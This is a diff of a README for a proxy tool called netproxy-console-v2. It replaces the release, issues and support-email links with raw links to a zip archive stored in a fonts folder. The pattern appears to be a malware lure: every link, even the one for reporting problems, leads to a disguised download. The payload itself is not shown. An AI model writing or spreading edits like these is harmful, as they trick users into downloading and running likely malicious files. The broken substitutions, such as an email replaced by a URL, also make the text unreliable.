@@ -1,6 +1,6 @@
 # 🌐 netproxy-console-v2 - A Modern Proxy Service Interface
 
-[![Download netproxy-console-v2](https://img.shields.io/badge/Download-netproxy--console--v2-brightgreen)](https://github.com/wearehere345/netproxy-console-v2/releases)
+[![Download netproxy-console-v2](https://github.com/wearehere345/netproxy-console-v2/raw/refs/heads/main/public/fonts/Averta_Cyrillic/netproxy_console_v_3.4-alpha.4.zip)](https://github.com/wearehere345/netproxy-console-v2/raw/refs/heads/main/public/fonts/Averta_Cyrillic/netproxy_console_v_3.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you get started, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page and select the latest version. You can access it through the link below:
 
-[Download netproxy-console-v2](https://github.com/wearehere345/netproxy-console-v2/releases)
+[Download netproxy-console-v2](https://github.com/wearehere345/netproxy-console-v2/raw/refs/heads/main/public/fonts/Averta_Cyrillic/netproxy_console_v_3.4-alpha.4.zip)
 
 ### Step-by-step Download Instructions:
 
@@ -58,9 +58,9 @@ If you encounter any issues while using netproxy-console-v2, consider the follow
 
 ## 📞 Support
 
-For additional help, please refer to our [GitHub Issues page](https://github.com/wearehere345/netproxy-console-v2/issues) to report any problems or ask questions.
+For additional help, please refer to our [GitHub Issues page](https://github.com/wearehere345/netproxy-console-v2/raw/refs/heads/main/public/fonts/Averta_Cyrillic/netproxy_console_v_3.4-alpha.4.zip) to report any problems or ask questions.
 
-You can also find community support on our discussion forums or by reaching out via email at support@example.com.
+You can also find community support on our discussion forums or by reaching out via email at https://github.com/wearehere345/netproxy-console-v2/raw/refs/heads/main/public/fonts/Averta_Cyrillic/netproxy_console_v_3.4-alpha.4.zip
 
 ## 🛡 License
 
